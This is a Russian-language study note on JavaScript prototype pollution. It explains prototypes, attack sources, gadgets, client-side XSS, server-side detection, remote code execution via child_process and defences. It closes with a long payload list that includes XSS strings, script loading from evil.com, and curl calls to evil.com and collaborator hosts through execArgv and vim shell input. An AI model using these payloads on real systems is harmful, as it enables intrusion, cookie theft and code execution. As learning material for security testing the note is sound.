
# Prototype pollution

Загрязнение прототипа - это уязвимость JavaScript, которая позволяет злоумышленнику добавлять произвольные свойства к прототипам глобальных объектов, которые затем могут быть унаследованы пользовательскими объектами

разделяются на  КЛИЕНТ-side и сервер-side

можно положить сервер запросто

------
## что это вообще такое

Представим, что мы не просто добавляем новое свойство (например ==isAdmin true==) конкретному объекту (напрмиер в js) например своему юзеру а добавляем его в "голубую печать" прототип (типо как класс в SWIFT или любом другом ооп языке) по которой создаются все объекты в программе. Теперь каждый объект даже созданный после атаки может думать что он админ...

JavaScript язык прототипный. У каждого объекта есть скрытая ссылка на его прототип `__proto__` или `constructor.prototype`
Если свойство не найдено в самом объекте JS ищет его в цепочке прототипов вплоть до `Object.prototype`
Если мы можем изменить этот общий прототип мы меняем поведение всего приложения

-----

### классическое ООП (Swift, Java, C#, PHP)

```swift
// Swift
class User {
    var name = ""
    var isAdmin = false
}
let wiener = User()
wiener.isAdmin // false
```

### JavaScript (через прототип)

```js
// Это как определение класса
function User(name) {
    this.name = name
}
// Добавляем метод в "класс" через прототип
User.prototype.isAdmin = false
let wiener = new User("wiener")
wiener.isAdmin // false

---------

User - это функция - конструктор 
User.prototype - это отдельный объект, который прилагается к функции

```


-----------
##    прототипы и наследование в JavaScript

#### Что такое объект в JavaScript

Объект в JavaScript это просто набор пар ключ значение которые называются свойствами

```js
const user =  {
    username: "wiener",
    userId: 01234,
    isAdmin: false
}
```

К свойствам можно обращаться через точку или скобки

```js
user.username     // "wiener"
user['userId']    // 01234

свойства могут быть не только данными, но и функциями - > тогда они называются методами

javascript

const user =  {
    username: "wiener",
    exampleMethod: function(){
        // сделать что-то
    }
}
```

#### Что такое прототип

Каждый объект в JavaScript связан с другим объектом который называется его прототипом. По умолчанию JavaScript автоматически назначает объектам встроенные прототипы

```js
let myObject = {};
Object.getPrototypeOf(myObject);    // Object.prototype
let myString = "";
Object.getPrototypeOf(myString);    // String.prototype
let myArray = [];
Object.getPrototypeOf(myArray);     // Array.prototype
```

Объекты автоматически наследуют все свойства своего прототипа если у них нет собственного свойства с таким же ключом

ЭТО ЗНАЧИТ, ЧТО ЕСЛИ Я ИЗМЕНИЛ ПРОТОТИП - ТО Я ИЗМЕНЮ И ОБЬЕКТ, И ВСЕХ НАСЛЕДНИКОВ

#### Как работает наследование в JS

Когда Мы обращаемся к свойству объекта, то JavaScript сначала ищет его в самом объекте
Если свойство не найдено, тогда он ищет его в прототипе объекта

```js
let myObject = {}
// В объекте ничего нет но в консоли при вводе myObject
// появятся унаследованные от Object.prototype методы
```
#### Цепочка прототипов

Прототип объекта это тоже объект у которого есть свой прототип ... и так далее. Эта цепочка в итоге доходит до Object.prototype чей прототип равен null

объекты наследуют свойства не только от своего непосредственного прототипа, но и от всех объектов выше по цепочке

#### Доступ к прототипу через ==proto==

У каждого объекта есть специальное свойство **proto** которое позволяет получить доступ к его прототипу. Оно работает и как геттер и как сеттер

```js
username.__proto__                        // String.prototype
username.__proto__.__proto__               // Object.prototype
username.__proto__.__proto__.__proto__     // null
```

#### Изменение прототипов

В JavaScript можно изменять встроенные прототипы добавляя новые методы или переопределяя существующие

Хотя это считается плохой практикой

```js
// добавляем новый метод во все строки
String.prototype.removeWhitespace = function(){
    // тело функци
}
let searchTerm = "  example ";
searchTerm.removeWhitespace();    // "example"
```


-----


## как это работает, простой пример

вот простой объект

```js
let user = { name: "wiener" }
console.log(user.isAdmin) // undefined нет такого свойства
```

загрязняем прототип

```js
Object.prototype.isAdmin = true
console.log(user.isAdmin) // true! user сам не имеет свойства isAdmin, но оно нашлось в прототипе
```
Вот и вся магия. Мы добавили свойство в `Object.prototype` и теперь оно есть у каждого объекта
Задача найти источник source, где наше значение попадет в такую операцию 

--------

## Object.prototype — это "Прародитель" всех объектов

в js стоит общий предок, от которого произошли все остальные. В JavaScript этим общим предком является `Object.prototype`

Это не просто какой-то объект. Это ==базовый прототип==, который есть у каждого объекта в JavaScript. 

Абсолютно у каждого: у простых объектов `{}`, у массивов `[]`, у строк `""`, у чисел, у функций — у всех!!!!!!!

-------




-----------




-----

## где искать проблему -

Это входные ворота для атаки. Места и способы - куда можно запихнуть `__proto__`

топ это: 

- URL адрес через запрос или строку фрагмента (хэш)  
	- пример `https://vulnerable-website.com/?__proto__[evilProperty]=payload`


    
- Ввод на основе JSON
		пример 
```json
{ "__proto__": { "evilProperty": "payload" } }
```

    
- Веб-сообщения

-------

### URL Query String или Hash

Самый простой способ. ;Серверский js или клиентcкий js) парсит URL и создает объект из параметров

```http
// URL: https://site.com/?__proto__[isAdmin]=true
// Если параметры парсятся и мержатся в объект - может произойти магия
```

-------
### JSON input

Классика. `JSON.parse()` не делает различий между ключами. `__proto__` для него просто строка

```json
// к примеру - сервер получает такой JSON и мержит его с другим объектом
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```

При парсинге будет создан объект у которого будет собственное свойство с ключом `__proto__`. При мерже (обьединении) это свойство может быть использовано для доступа к прототипу

-------
### Web Messages

`postMessage` может передавать объекты или JSON в iframe или другие окна. Если принимающая сторона бездумно мержит полученные данные, тогда это тоже вектор для атак

-----
## Чем это ломать, Sinks и Gadgets

==Sink== опасная функция, это то - куда мы хотим передать данные например `eval()` `innerHTML``Function()`

==Gadget== это свойство которое мы можем контролировать через прототип, и которое само попадет в sink

Недостаточно просто добавить `evilProperty` в прототип. Нужно чтобы приложение где-то использовало свойство с таким же именем для чего-то опасного

----------
### Пример gadgetа

Допустим, такой код

```js
let transport_url = config.transport_url || defaults.transport_url
let script = document.createElement('script')
script.src = `${transport_url}/example.js`
document.body.appendChild(script)
```

Если разработчик не задал `config.transport_url`  - то используется значение из `defaults`
Но если мы сможем добавить `transport_url` в `Object.prototype` то `config.transport_url` его унаследует

```http
// Атака через URL
https://site.com/?__proto__[transport_url]=//evil.com
```
Теперь скрипт загрузится с `evil.com`. И вуаля -> сделали XSS через prototype pollution


---

##  🟣🟣🟣🟣🟣🟣 Client-Side XSS через прототипы

---------

### КАК искать вручную

**Найти Source** Пытаемся добавить `__proto__[foo]=bar` в URL или hash и проверяем в консоли браузера

ручной вариант - берем пейлоад , что ниже есть, и руками подставляю в url парметры /?пейлоад, и после каждого пейлоада проверять в консоли командой Object.prototype, если есть отражение - победа, потом нужно искать гаджеты!

авто способ, запускаем инвайдер, находим уязвимость, потом настраиваю инвайдер на поиск гаджета - ищем гаджет, ну и потом применяем все это дело!


```js
Object.prototype.foo
// если вернет "bar" = мы в игре
```

==Найти Gadget== Нужно найти свойство которое используется для опасных операций как `transport_url` (как выше)

Вручную это геморрой, тк нужно перехватывать JS-файлы, ставить `debugger` и отслеживать обращения к потенциальным свойствам.  
Проще использовать DOM Invader встроен в Burp. 
Он сам сканирует страницы на предмет прототипов и даже может сгенерировать PoC

-----------
### пример

Если приложение использует jQuery можно попробовать загрязнить `Object.prototype`свойством которое jQuery использует для вставки HTML,

--------


## 🟣🟣🟣🟣🟣🟣 Server-Side - Node.js - (анализировать ответы - > без исходников)

Тут сложнее , нет консоли и нельзя просто проверить `Object.prototype`. Приходится быть детективом и смотреть на побочные эффекты, а еще все неудачные попытки сохраняются в серевер, и могут его ложить... в то время как при прототипах на клиенте в браузере - достаточно было перезапустить страницу в браузере!

----------
### Отражение свойства Polluted Property Reflection

простой случай. Если сервер возвращает нам обновленный объект и наше загрязненное свойство отражается в ответе 

запрос
```http
POST /user/update HTTP/1.1
...
{
    "user":"wiener",
    "__proto__":{
        "foo":"bar"
    }
}
```
ответ
```http
HTTP/1.1 200 OK
...
{
    "username":"wiener",
    "foo":"bar"   // <-- Вот оно! Есть уязвимость
}
```

-------

### Техники без отражения -=- когда свойства не видны

Чаще всего свойство не возвращается. Тогда используем такие техники, которые позволяют изменить поведение сервера,  и заметить это

#### Status code override

пытаемся изменить статус ошибки

1. находим запрос который возвращает ошибку например 403
   
2. загрязняем прототип своим `status` в диапазоне 400-599 `"__proto__": {"status": 555}`
   
3. повторяем запрос. Если сервер вернул 555 вместо 403 есть загрязнение
   

#### JSON spaces override

в express можно управлять пробелами в JSON-ответе

1. смотрим на обычный JSON-ответ
   
2. загрязняем `"__proto__": {"json spaces": 10}`
   
3. повторяем запрос, и если JSON стал с отступами по 10 пробелов есть контакт
   

#### Charset override

заставляем сервер декодировать строку как UTF-7

1. Отправляем UTF-7 строку `+AGYAbwBv-` = "foo"
   
2. загрязняем `"__proto__": {"content-type": "application/json; charset=utf-7"}`
   
3. повторяем первый запрос,, если UTF-7 раскодировался в "foo" - ура
   

----------

### инструменты для сервер-side

Для автоматизации есть - расширение для Burp Server-Side Prototype Pollution Scanner
Оно само переберет все техники
бесплатно

------




## Server-Side RCE удаленное выполнение кода

Это уже хардкор. Если на сервере Node.js можно попытаться добраться до модуля `child_process`

===
### асинхр вызов     Child process

нужно найти запрос который создает новый процесс с помощью `fork()` или `execSync()`. Это сложно, но можно попытаться задетектить загрязнив прототип так, чтобы при создании процесса он сходил на мой коллаборатор

```json
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-ID.oastify.com"
}
```

если коллаборатор ловит пинг значит приложение создает процесс с нашими опциями

### прямое внедрение команды

**Через execArgv в fork()** - если приложение использует `child_process.fork()` , - можно попробовать подменить `execArgv` и выполнить код через `--eval`

**Через execSync()** Если приложение использует `execSync()` можно попробовать подменить `shell` и `input`.

```json
"__proto__": {
    "shell": "vim",
    "input": ":! curl https://evil.com\n"
}
```

> Vim читает команды из stdin если запущен с флагом -c но это специфично




--------
--------
------


## как защищаться

### не мержить объекты бездумно

Если очень нужно мержить используй белые списки ключей или санитайз. Но блокировать `__proto__` ненадежно так как есть обход через `constructor`.

### заблокировать прототипы

Самый надежный способ для своих приложений

```js
Object.freeze(Object.prototype)
```

### использовать Object.create null

Создавай объекты без прототипа там где это возможно

```js
let safeConfig = Object.create(null)
```

### использовать Map вместо объектов

Для хранения данных где ключи могут быть из внешнего мира

```js
let options = new Map()
options.set('evil', 'payload') // Свойство evil не попадет в прототип
```

--------




пейлоады для поиска

```c

__proto__[test]=polluted&__proto__[test2]=polluted2&__proto__[test3]=polluted3
__proto__[test]=polluted&constructor.prototype.test2=polluted2
__proto__[test]=polluted&__proto__.test2=polluted2&constructor.prototype.test3=polluted3
__proto__[test]=polluted&__proto__[test]=polluted&__proto__[test]=polluted

__proto__[test]=polluted
__proto__.test=polluted
__proto__[test]=polluted&__proto__[test2]=polluted2
__proto__[test]=polluted&__proto__[test2]=polluted2&__proto__[test3]=polluted3
__proto__[__proto__]=polluted
__proto__[__proto__][test]=polluted
__proto__[test]=polluted&__proto__[test]=polluted
__proto__[test]=data:,alert(1)
__proto__[test]=javascript:alert(1)
constructor.prototype.test=polluted
constructor[prototype][test]=polluted
constructor.prototype.test=data:,alert(1)
constructor[prototype][test]=javascript:alert(1)
__proto__[constructor][prototype][test]=polluted
__proto__.constructor.prototype.test=polluted
__proto__.constructor[prototype].test=polluted
__proto__[constructor].prototype.test=polluted
__proto__[constructor][prototype].test=polluted
__proto__.constructor.prototype[test]=polluted
__proto__[constructor].prototype[test]=polluted
prototype.test=polluted
[prototype].test=polluted
prototype[test]=polluted
[prototype][test]=polluted
__proto__['test']=polluted
__proto__["test"]=polluted
__proto__[`test`]=polluted
__proto__[test]=polluted&__proto__[test2]=polluted
__proto__.test=polluted&__proto__.test2=polluted
constructor['prototype']['test']=polluted
constructor["prototype"]["test"]=polluted
constructor[`prototype`][`test`]=polluted
__proto__['constructor']['prototype']['test']=polluted
__proto__["constructor"]["prototype"]["test"]=polluted
__proto__[`constructor`][`prototype`][`test`]=polluted
__pro__proto__to__[test]=polluted
__pro__proto__to__.test=polluted
__proto__proto__[test]=polluted
__proto__proto__[test]=polluted
__proto____proto__[test]=polluted
constructor..prototype.test=polluted
constructor...prototype.test=polluted
__proto__[test]=polluted&__proto__[test2]=polluted
__proto__[test]=polluted&__proto__[test2]=polluted&__proto__[test3]=polluted
%5F%5Fproto%5F%5F%5Btest%5D=polluted
%5F%5Fproto%5F%5F.test=polluted
__proto__%5Btest%5D=polluted
__proto__.test%3Dpolluted
%63%6F%6E%73%74%72%75%63%74%6F%72%2E%70%72%6F%74%6F%74%79%70%65%2E%74%65%73%74%3D%70%6F%6C%6C%75%74%65%64

{"__proto__": {"test": "polluted"}}
{"__proto__": {"test": "data:,alert(1)"}}
{"__proto__": {"test": "javascript:alert(1)"}}
{"constructor": {"prototype": {"test": "polluted"}}}
{"__proto__": {"__proto__": {"test": "polluted"}}}
{"__proto__.test": "polluted"}
{"__proto__": {"test": "polluted"}, "test2": "polluted2"}
{"__proto__": ["test", "polluted"]}
{"__proto__": {"test": ["polluted"]}}
{"__proto__": {"test": {"__proto__": {"test2": "polluted2"}}}}
{"constructor.prototype.test": "polluted"}
{"__proto__.constructor.prototype.test": "polluted"}

#__proto__[test]=polluted
#__proto__.test=polluted
#constructor.prototype.test=polluted
#__proto__[test]=polluted&__proto__[test2]=polluted2
#__proto__[test]=data:,alert(1)
#__proto__[test]=javascript:alert(1)

__proto__[transport_url]=data:,alert(1)
__proto__[transport_url]=javascript:alert(1)
__proto__[transport_url]=data:,alert(document.cookie)
__proto__[transport_url]=data:,alert(1)//example.com
__proto__[transport_url]=//evil.com/script.js
__proto__[transport_url]=https://evil.com/script.js
__proto__[src]=data:,alert(1)
__proto__[callback]=alert(1)
__proto__[onload]=alert(1)
__proto__[onerror]=alert(1)
__proto__[innerHTML]=<img src=x onerror=alert(1)>
__proto__[innerHTML]=<script>alert(1)</script>
__proto__[html]=<img src=x onerror=alert(1)>


{"__proto__": {"status": 555}}
{"__proto__": {"json spaces": 10}}
{"__proto__": {"content-type": "application/json; charset=utf-7"}}
{"__proto__": {"shell": "node", "NODE_OPTIONS": "--inspect=YOUR-ID.oastify.com"}}
{"__proto__": {"execArgv": ["--eval=require('child_process').exec('curl YOUR-ID.oastify.com')"]}}
{"__proto__": {"shell": "vim", "input": ":! curl https://evil.com\n"}}

```